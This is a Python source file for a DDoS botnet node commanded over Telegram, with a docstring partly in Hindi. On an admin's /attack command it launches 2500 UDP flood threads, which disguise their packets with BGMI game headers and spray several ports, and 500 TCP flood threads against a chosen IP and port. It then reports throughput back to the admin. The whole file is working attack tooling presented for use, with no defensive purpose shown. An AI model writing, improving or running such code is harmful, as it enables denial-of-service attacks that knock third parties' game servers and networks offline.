#!/usr/bin/env python3
"""
ATTACK NODE - Har VPS pe run karo
3000 threads UDP + TCP flood
"""

import asyncio, time, socket, random, threading, sys
from telethon import TelegramClient, events
import config

NODE_ID = sys.argv[1] if len(sys.argv) > 1 else "1"
BOT_TOKEN = config.NODE_TOKENS[int(NODE_ID) - 1]

class AttackNode:
    def __init__(self):
        self.running = False
        self.pkts = 0
        self.bytes_out = 0
        self.lock = threading.Lock()
    
    def udp_flood(self, ip, port, end_time):
        """UDP flood on game ports"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        sock.settimeout(0.0001)
        
        # BGMI game packet types
        game_headers = [
            b'\x01\x00\x00\x00', b'\x02\x00\x00\x00',
            b'\x03\x00\x00\x00', b'\x04\x00\x00\x00',
            b'\x05\x00\x00\x00',
        ]
        
        while self.running and time.time() < end_time:
            try:
                for _ in range(20):
                    if not self.running:
                        break
                    
                    header = random.choice(game_headers)
                    data = random.randbytes(random.randint(500, 1400))
                    pkt = header + data
                    
                    # Hit multiple ports
                    for p in [port, port+1, port+2, random.choice(config.BGMI_PORTS)]:
                        sock.sendto(pkt, (ip, p))
                        with self.lock:
                            self.pkts += 1
                            self.bytes_out += len(pkt)
            except:
                pass
        sock.close()
    
    def tcp_flood(self, ip, port, end_time):
        """TCP SYN flood"""
        while self.running and time.time() < end_time:
            try:
                for _ in range(5):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.2)
                    sock.connect_ex((ip, port))
                    sock.send(random.randbytes(1024))
                    sock.close()
                    with self.lock:
                        self.pkts += 1
                        self.bytes_out += 1024
            except:
                pass
    
    def start(self, ip, port, dur):
        self.running = True
        self.pkts = 0
        self.bytes_out = 0
        
        end_time = time.time() + dur
        workers = []
        
        print(f"[NODE-{NODE_ID}] Attacking {ip}:{port} for {dur}s")
        
        # 2500 UDP threads
        for _ in range(2500):
            t = threading.Thread(target=self.udp_flood, args=(ip, port, end_time))
            t.daemon = True; t.start(); workers.append(t)
        
        # 500 TCP threads
        for _ in range(500):
            t = threading.Thread(target=self.tcp_flood, args=(ip, port, end_time))
            t.daemon = True; t.start(); workers.append(t)
        
        print(f"[NODE-{NODE_ID}] 3000 threads running!")
        
        time.sleep(dur)
        self.running = False
        
        for t in workers:
            t.join(timeout=0.1)
        
        mbps = (self.bytes_out * 8) / (dur * 1_000_000) if dur > 0 else 0
        
        print(f"[NODE-{NODE_ID}] Done! {self.pkts:,} pkts | {mbps:.1f} Mbps")
        
        return {'pkts': self.pkts, 'mb': self.bytes_out/1024/1024, 'mbps': mbps}

node = AttackNode()
bot = TelegramClient(f'node_{NODE_ID}', config.API_ID, config.API_HASH)

@bot.on(events.NewMessage(pattern='/attack'))
async def attack(event):
    if event.sender_id != config.ADMIN_ID:
        return
    
    if node.running:
        return await event.reply(f"⚠️ NODE-{NODE_ID} BUSY!")
    
    parts = event.text.split()
    ip, port, dur = parts[1], int(parts[2]), int(parts[3])
    
    await event.reply(f"💀 NODE-{NODE_ID}: Attacking {ip}:{port}")
    
    loop = asyncio.get_event_loop()
    stats = await loop.run_in_executor(None, node.start, ip, port, dur)
    
    await event.reply(
        f"✅ NODE-{NODE_ID} DONE!\n"
        f"📦 {stats['pkts']:,} pkts\n"
        f"📤 {stats['mb']:.1f} MB\n"
        f"📶 {stats['mbps']:.1f} Mbps"
    )

@bot.on(events.NewMessage(pattern='/stop'))
async def stop(event):
    node.running = False
    await event.reply(f"⛔ NODE-{NODE_ID} STOPPED!")

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    print(f"[✓] NODE-{NODE_ID} READY!")
    await bot.run_until_disconnected()

asyncio.run(main())
